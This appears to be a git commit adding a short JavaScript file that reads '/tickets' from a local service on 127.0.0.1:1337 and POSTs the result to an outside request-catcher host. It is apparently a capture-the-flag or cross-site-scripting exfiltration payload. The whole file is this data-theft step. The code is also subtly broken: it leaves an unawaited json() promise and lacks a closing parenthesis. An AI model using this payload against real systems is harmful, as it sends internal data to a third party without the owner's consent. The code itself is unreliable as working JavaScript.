9926b627b1b51206a33d1d60aa1ca9b5f1b273ce
UnlikeLemon <83449816+UnlikeLemon@users.noreply.github.com>
2021-10-23 08:45:52 -0700

    Create js_script.js

---
+++ js_script.js
@@ -0,0 +1,11 @@
+let response = await fetch("http://127.0.0.1:1337/tickets");
+let json = response.json();
+
+let send_data = await fetch("https://lemon.requestcatcher.com/", {
+  method: 'POST',
+  headers: {
+    'Content-Type':'application/json;charset=utf-8'
+  },
+  body: JSON.stringify(json)
+};
+                            
